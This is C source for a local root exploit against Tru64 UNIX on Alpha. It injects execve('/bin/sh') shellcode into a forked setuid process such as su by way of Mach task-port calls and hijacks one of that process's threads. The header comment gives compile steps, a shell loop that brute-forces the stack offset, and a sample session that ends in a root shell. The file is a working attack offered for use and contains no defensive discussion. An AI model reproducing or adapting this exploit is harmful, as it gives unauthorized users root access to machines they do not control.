/* mach_task shellcode injector & host task tester Tru64 / alpha
   =============================================================
   compile "cc tru64inject.c -o tru64inject -lpset -lmach"
   run with ./tru64inject /usr/bin/cat 488

   need offset or brute force? use as below

   tru64> for i in `perl -e 'for($a=0;$a<512;$a++){printf("%d\n",$a);}'`;
   > do ./tru64inject /usr/bin/su $i
   > done

   - if task_for_pid ever succeeds then you have BSD over mach as only
   root should be able to get host task port.
   
tru64> ./tru64inject /usr/bin/su 480
[ mach root check & inject
[ stack offset using 0x1e0
[ child pid is 115099
[ task_by_unix_pid() = 0
[ task_for_pid() = 0
[ You are root, Sire
[ vm_allocate() = 0
[ vm_protect() = 0
[ vm_copy() = 0
[ task_threads() = 0
[ thread_suspend() = 0
[ thread_get_state() = 0
[ vm_protect() = 0
[ thread_set_state() = 0
[ thread_resume() = 0
# id
uid=200(sorcerer) gid=15(users) euid=0(root)
# exit

  -- https://hacker.house
*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <mach.h>

/* global */
char* args[]={"su",0};
char* envs[]={0};
unsigned char shellcode[] = {
	"\x80\xff\xde\x23"   /* lda $sp,-128($sp)   */
	"\x73\x68\x3f\x24"   /* ldil $1, 0x68732f2f */
	"\x2f\x2f\x21\x20"   /* sll $1, 0x20        */
	"\x21\x17\x24\x48"   /* ldil $2, 0x6e69622f */
	"\x69\x6e\x5f\x24"   /* addq $1, $2, $1     */
	"\x2f\x62\x42\x20"   /* stq $31, -32($sp)   */
	"\x01\x04\x22\x40"   /* stq $31, -24($sp)   */
	"\xe0\xff\xfe\xb7"   /* stq $31, -8($sp)    */
	"\xe8\xff\xfe\xb7"   /* stq $1, -16($sp)    */
	"\xf8\xff\xfe\xb7"   /* mov $sp, $16        */
	"\xf0\xff\x3e\xb4"   /* subq $16, 0x10, $16 */
	"\x10\x04\xfe\x47"   /* stq $16, -40($sp)   */
	"\x30\x15\x02\x42"   /* mov $sp, $17        */
	"\xd8\xff\x1e\xb6"   /* subq $17, 0x28, $17 */
	"\x11\x04\xfe\x47"   /* mov $sp, $18        */
	"\x31\x15\x25\x42"   /* subq $18, 0x18, $18 */
	"\x12\x04\xfe\x47"   /* ldil $0, 0xffffff3c */
	"\x32\x15\x43\x42"   /* ldil $1, 0xffffff01 */
	"\x3c\xff\x1f\x20"   /* subq $0, $1, $0     */
	"\x01\xff\x3f\x20"   /* ldil $1, 0xffffff84 */
	"\x20\x05\x01\x40"   /* ldil $2, 0xffffff01 */
	"\x84\xff\x3f\x20"   /* subq $1, $2, $1     */
	"\x01\xff\x5f\x20"   /* stl $1, -48($sp)    */
	"\x21\x05\x22\x40"   /* subq $sp, 0x30, $sp */
	"\xd0\xff\x3e\xb0"   /* jmp $sp,($sp),0xff10 */
	"\x3e\x15\xc6\x43"   
	"\xc4\x3f\xde\x6b"   /* power to the people */
};

task_t task_for_pid(int pid){
	int res = 0;
	host_t host = host_self();
        /* if you have root permissions we can get send rights to all here */
	/* if we have host_priv_t from kload'er we can use these routines */
        /* docs say only way to obtain host_priv_t is at kload & as root host_priv_self */
	host_priv_t hostpriv = host_priv_self();
	processor_set_name_t pset; 
	processor_set_t pcpu; 
	processor_set_default(host,&pset);
	res = xxx_processor_set_default_priv(hostpriv,&pcpu);
	printf("[ task_for_pid() = %d\n",res);
	if(res==0){
		printf("[ GROOT!\n");
		execve("/usr/bin/su",args,envs);
	}
	return(task_self());
}

void usage(){
	printf("require <path> <offset>\n");
}

int main(int argc, char* argv[]){
	int res;
	pid_t pid;
	task_t sploittask;
	thread_t magicthread;
	struct alpha_thread_state axpt;
	unsigned int axpti = sizeof(axpt);
	vm_address_t addr = trunc_page(8192);
	int size = trunc_page(8192);
	int offset = 0x1e8; /* /usr/bin/cat */
	unsigned int threadsize;
	thread_array_t threads;
	printf("[ mach root check & inject\n");
	if(argc < 3){
		usage();
		exit(0);
	}
	offset=atoi(argv[2]);
	printf("[ stack offset using 0x%x\n",offset);
	pid = fork();
	switch(pid){
			case 0:
				pid = getpid();
				execve(argv[1],args,envs);
				break;
			default:
				printf("[ child pid is %d\n",pid);
				break;
	}
	res = task_by_unix_pid((task_t)task_self(),pid,&sploittask);
	printf("[ task_by_unix_pid() = %d\n",res); 
	task_for_pid(pid);
	res = vm_allocate(sploittask,&addr,size,TRUE);
	printf("[ vm_allocate() = %d\n",res);
	res = vm_protect(sploittask,addr,size,FALSE,(VM_PROT_READ|VM_PROT_WRITE|VM_PROT_EXECUTE));
	printf("[ vm_protect() = %d\n",res);
	res = vm_copy(sploittask,trunc_page(shellcode),size,addr);
	printf("[ vm_copy() = %d\n",res);
	res = task_threads(sploittask,&threads,&threadsize);
	printf("[ task_threads() = %d\n",res);
	magicthread = threads[0];
	res = thread_suspend(magicthread);
	printf("[ thread_suspend() = %d\n",res);
	res = thread_get_state(magicthread,ALPHA_THREAD_STATE,(thread_state_t)&axpt,&axpti);
	printf("[ thread_get_state() = %d\n",res);
	res = vm_protect(sploittask,axpt.r30,size,FALSE,(VM_PROT_READ|VM_PROT_WRITE|VM_PROT_EXECUTE));
	printf("[ vm_protect() = %d\n",res);
	axpt.pc = addr+offset; // mov stack, inc offset
	res = thread_set_state(magicthread,ALPHA_THREAD_STATE,(thread_state_t)&axpt,axpti);
	printf("[ thread_set_state() = %d\n",res);
	res = thread_resume(magicthread);
	printf("[ thread_resume() = %d\n",res);
	waitpid(pid,0,0);
}
